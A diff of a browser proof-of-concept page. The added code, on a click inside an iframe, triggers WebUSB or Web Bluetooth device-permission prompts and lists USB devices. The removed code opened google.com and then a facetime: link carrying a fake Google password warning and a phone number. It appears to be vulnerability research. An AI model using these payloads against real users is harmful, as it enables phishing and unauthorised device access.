@@ -1,20 +1,43 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body { height: 90vh; }</style>
+</head>
+<body>
+<h1>Tap anywhere in iframe to run PoC</h1>
+<p>Current PoC: <span id="output"></span></p>
+<p>iframe on: <span id="originOutput"></span></p>
+<p id="usbOutput"></p>
+<script>
+originOutput.innerText = window.location.origin;
 
-<html> <body> <script> function cc(){ window.open("http://www.google.com"); }
-
-function bb(){
-var link = document.createElement('a');
-link.href = 'facetime:google.com says:%0a%0dWarning!Please%20Change%20Your%20Google%20Password%0a%0dCall:0987-65432';
-link.click();
-document.body.appendChild(link);
+// Default to Bluetooth PoC
+var currentPoC = 'Bluetooth';
+if (window.location.search.indexOf('usb') > -1) {
+    currentPoC = 'USB';
+    setInterval(() => {
+        navigator.usb.getDevices().then((devices) => {
+            usbOutput.innerText = '';
+            devices.forEach((device) => {
+                usbOutput.innerText = usbOutput.innerText + device.productId + ', ' + device.vendorId + ', ' + device.productName + "\n";
+            });
+        });
+    }, 3000);
 }
 
-function aa()
-{
-setTimeout('cc()','0');
-setTimeout('bb()','500');
+output.innerText = currentPoC;
 
-}
+window.addEventListener('click', (e) => {
+    if (currentPoC == 'USB') {
+        navigator.usb.requestDevice({filters:[]});
+    } else {
+        navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+    }
+});
 </script>
-
-<button onclick="aa()">Click me</button>
-</body> </html> 
+</body>
+</html>
